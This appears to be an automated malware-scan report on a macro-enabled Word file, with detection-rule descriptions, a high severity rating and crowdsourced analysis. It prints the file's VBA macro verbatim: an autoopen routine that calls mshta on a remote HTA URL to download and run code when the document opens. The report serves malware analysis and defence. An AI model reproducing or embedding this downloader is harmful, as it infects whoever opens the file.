sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

macros.vba_code:
Sub autoopen()
'
' autoopen Macro
'
'
Shell ("mshta https://login-main.bigwnet.com/attachment/view/Msgxo.hta")
End Sub

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis:
The provided macros exhibit clear signs of malicious intent. The macro named `autoopen()` is particularly concerning due to its use of the `Shell` function to execute a command that opens an HTA (HTML Application) file from a remote URL (`https://login-main.bigwnet.com/attachment/view/Msgxo.hta`). This behavior indicates an attempt to download and execute potentially harmful content without user consent.

The use of `mshta` is noteworthy as it allows for the execution of HTML applications, which can contain scripts capable of performing various actions on the system, including but not limited to downloading additional malware, stealing information, or executing arbitrary commands. This method of execution is often employed by attackers to bypass certain security measures since HTA files can run scripts in a more permissive environment compared to standard executables.

Additionally, the presence of the `autoopen()` subroutine suggests that this macro will automatically run when the document is opened, indicating an intention to propagate itself without user interaction. This aligns with common tactics used in macro-based malware to ensure persistence and stealth.

Overall, the combination of remote execution, automatic triggering, and the potential for further malicious activity categorizes these macros as malicious.

The macro defines an `autoopen` subroutine. This subroutine executes a shell command. The command invokes `mshta.exe` with a URL as an argument. The URL points to `https://login-main.bigwnet.com/attachment/view/Msgxo.hta`.  This action effectively downloads and executes an HTA (HTML Application) file from the specified URL.
